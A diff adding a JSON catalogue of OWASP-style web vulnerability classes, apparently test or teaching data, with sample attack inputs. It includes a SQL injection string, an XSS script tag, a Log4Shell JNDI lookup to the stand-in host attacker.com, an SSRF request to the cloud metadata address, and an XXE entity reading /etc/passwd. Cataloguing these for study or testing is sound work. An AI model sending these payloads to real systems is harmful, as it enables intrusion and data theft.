@@ -1,0 +1,158 @@
+[
+  {
+    "id": "A01",
+    "name": "Broken Access Control",
+    "description": "Access control policies are not enforced correctly, allowing users to perform actions or access data beyond their permissions.",
+    "attack_scenario": "An attacker changes a URL parameter to access another user's private resource because no authorization check exists on the server.",
+    "POVs": [
+      {
+        "url": "/api/user/1235",
+        "params": { "id": "1235" },
+        "payload": "Modify ID to access another user's data"
+      }
+    ]
+  },
+  {
+    "id": "A02",
+    "name": "Cryptographic Failures (Sensitive Data Exposure)",
+    "description": "Sensitive data is exposed due to weak or missing cryptographic controls, outdated algorithms, or unencrypted transmission.",
+    "attack_scenario": "Application stores passwords in plaintext or uses MD5 without salt; attacker cracks hashes after a database leak.",
+    "POVs": [
+      {
+        "url": "/login",
+        "params": { "username": "admin" },
+        "payload": "Intercept weakly hashed password and perform offline cracking"
+      }
+    ]
+  },
+  {
+    "id": "A03",
+    "name": "Injection",
+    "description": "Untrusted input is sent to interpreters such as SQL, NoSQL, OS, or LDAP without sanitization, resulting in unintended command execution. Includes SQL Injection and XSS in 2021.",
+    "attack_scenario": "Web app concatenates input into SQL query, allowing an attacker to manipulate query logic.",
+    "POVs": [
+      {
+        "url": "/product?id=1 OR 1=1",
+        "params": { "id": "1 OR 1=1" },
+        "payload": "SQL injection to bypass authentication"
+      }
+    ]
+  },
+  {
+    "id": "A03b",
+    "name": "Cross-Site Scripting (XSS)",
+    "description": "The application includes untrusted data in a web page without validation or escaping, allowing JavaScript execution in a victim’s browser.",
+    "attack_scenario": "A comment field does not sanitize HTML input; attacker injects malicious JavaScript that executes in other users’ browsers.",
+    "POVs": [
+      {
+        "url": "/comment",
+        "params": { "text": "<script>alert('XSS')</script>" },
+        "payload": "<script>alert('XSS')</script>"
+      }
+    ]
+  },
+  {
+    "id": "A04",
+    "name": "Insecure Design",
+    "description": "Security flaws arise from missing design controls or inadequate threat modeling, even if the code is correctly implemented.",
+    "attack_scenario": "An online banking system allows money transfers without requiring secondary confirmation or transaction limits.",
+    "POVs": [
+      {
+        "url": "/transfer",
+        "params": { "to": "attacker", "amount": "5000" },
+        "payload": "Repeated unauthorized transfers due to lack of design-level protection"
+      }
+    ]
+  },
+  {
+    "id": "A05",
+    "name": "Security Misconfiguration",
+    "description": "Misconfigured servers, frameworks, or applications—such as default credentials, verbose errors, or unnecessary features—expose systems to attacks.",
+    "attack_scenario": "The production system runs in debug mode, revealing stack traces and configuration secrets.",
+    "POVs": [
+      {
+        "url": "/debug",
+        "params": {},
+        "payload": "Access debug endpoint to reveal sensitive information"
+      }
+    ]
+  },
+  {
+    "id": "A06",
+    "name": "Vulnerable and Outdated Components",
+    "description": "Applications use outdated or vulnerable frameworks and libraries, allowing attackers to exploit known issues.",
+    "attack_scenario": "A server uses a vulnerable Log4j version; attacker exploits the JNDI injection vulnerability for remote code execution.",
+    "POVs": [
+      {
+        "url": "/search",
+        "params": { "q": "${jndi:ldap://attacker.com/a}" },
+        "payload": "Exploit outdated library vulnerability (e.g., Log4Shell)"
+      }
+    ]
+  },
+  {
+    "id": "A07",
+    "name": "Identification and Authentication Failures (Broken Authentication)",
+    "description": "Weak password policies, session fixation, or missing multi-factor authentication allow attackers to compromise accounts.",
+    "attack_scenario": "Login API does not limit attempts; attacker brute-forces passwords to gain access.",
+    "POVs": [
+      {
+        "url": "/login",
+        "params": { "username": "admin", "password": "123456" },
+        "payload": "Automated brute-force password attack"
+      }
+    ]
+  },
+  {
+    "id": "A08",
+    "name": "Software and Data Integrity Failures (Insecure Deserialization)",
+    "description": "Applications or CI/CD systems use code or data from untrusted sources without verifying integrity or signatures.",
+    "attack_scenario": "Application deserializes untrusted cookies that contain malicious serialized objects executing arbitrary code.",
+    "POVs": [
+      {
+        "url": "/api/deserialize",
+        "params": { "data": "malicious_serialized_payload" },
+        "payload": "Exploit insecure deserialization to trigger code execution"
+      }
+    ]
+  },
+  {
+    "id": "A09",
+    "name": "Security Logging and Monitoring Failures",
+    "description": "Insufficient logging and alerting prevent timely detection of attacks or breaches.",
+    "attack_scenario": "Brute-force attacks go unrecorded; administrators never detect compromised accounts.",
+    "POVs": [
+      {
+        "url": "/login",
+        "params": { "username": "victim" },
+        "payload": "Repeated failed logins not logged or monitored"
+      }
+    ]
+  },
+  {
+    "id": "A10",
+    "name": "Server-Side Request Forgery (SSRF)",
+    "description": "Server-side functionality fetches resources based on user input without proper validation, allowing attackers to target internal services.",
+    "attack_scenario": "File-fetching endpoint accepts arbitrary URLs, attacker accesses internal metadata services.",
+    "POVs": [
+      {
+        "url": "/fetch?url=http://169.254.169.254/latest/meta-data/",
+        "params": { "url": "http://169.254.169.254/latest/meta-data/" },
+        "payload": "SSRF exploit to read internal cloud data"
+      }
+    ]
+  },
+  {
+    "id": "A11",
+    "name": "XML External Entities (XXE)",
+    "description": "Improper XML parser configuration allows external entities, enabling file disclosure, SSRF, or DoS.",
+    "attack_scenario": "API processes XML input with default parser settings; attacker injects ENTITY referencing sensitive local file.",
+    "POVs": [
+      {
+        "url": "/uploadXML",
+        "params": {},
+        "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><user>&xxe;</user>"
+      }
+    ]
+  }
+]
